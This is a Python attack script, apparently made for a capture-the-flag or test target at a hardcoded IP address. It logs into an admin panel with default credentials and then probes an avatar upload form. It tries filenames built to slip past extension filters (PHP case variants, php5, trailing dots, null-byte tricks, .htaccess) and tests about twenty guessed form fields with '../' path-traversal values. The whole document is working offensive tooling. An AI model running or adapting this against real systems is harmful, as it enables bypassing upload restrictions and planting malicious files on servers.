import urllib.request, urllib.parse, http.cookiejar, re, uuid

BASE = "http://103.163.47.230:33662"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]


def req(p, data=None, method=None, ctype=None):
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
        ctype = ctype or "application/x-www-form-urlencoded"
    h = {"Content-Type": ctype} if data else {}
    r = urllib.request.Request(BASE + p, data=data, headers=h, method=method)
    try:
        resp = op.open(r, timeout=25)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def msg(b):
    t = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", re.sub(r"<style.*?</style>", "", b, flags=re.S)))
    m = re.search(r"已保存：\s*(\S+)", t)
    m2 = re.search(r"(头像已更新|禁止上传[^。]*|仅支持[^。]*|失败|错误[^。]*)", t)
    return (m.group(1) if m else "-"), (m2.group(1) if m2 else t[:80])


def upload(filename, content=b"\x89PNG\r\n\x1a\n" + b"\x00" * 40, field="avatar",
           ctype="image/png", extra=None):
    b = "----wb" + uuid.uuid4().hex
    body = b""
    body += f"--{b}\r\n".encode()
    body += f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode()
    body += f"Content-Type: {ctype}\r\n\r\n".encode()
    body += content + b"\r\n"
    for k, v in (extra or {}).items():
        body += f"--{b}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode()
        body += v.encode() + b"\r\n"
    body += f"--{b}--\r\n".encode()
    return req("/admin/", body, "POST", f"multipart/form-data; boundary={b}")


req("/admin/", {"username": "admin", "password": "admin123"}, "POST")

print("=== 扩展名变体")
for fn in ["x.htaccess", "x.PHP", "x.Php", "x.php5", "x.jpg", "x.gif", "x.png.",
          "x.php%00.png", "x.pHp", "x.inc", "x.conf", "x.ini", "x.svg", "x.xml",
          "x.html", "x.js", "x.txt", "x", ".htaccess", "x.php.", "x.png%00.php"]:
    s, b = upload(fn)
    path, m = msg(b)
    print(f"  {fn:18s} -> {s} saved={path:40s} {m[:50]}")

print("\n=== 额外字段（看保存路径是否受影响）")
FIELDS = ["legacy", "legacy_config", "config", "renderer", "compat", "sync", "old",
          "name", "filename", "path", "dir", "folder", "dest", "target", "file",
          "avatar_name", "prefix", "subdir", "renderer_config", "legacy_renderer"]
for f in FIELDS:
    s, b = upload("p.png", extra={f: "../wbtest"})
    path, m = msg(b)
    print(f"  {f:18s}=../wbtest -> saved={path:40s} {m[:44]}")
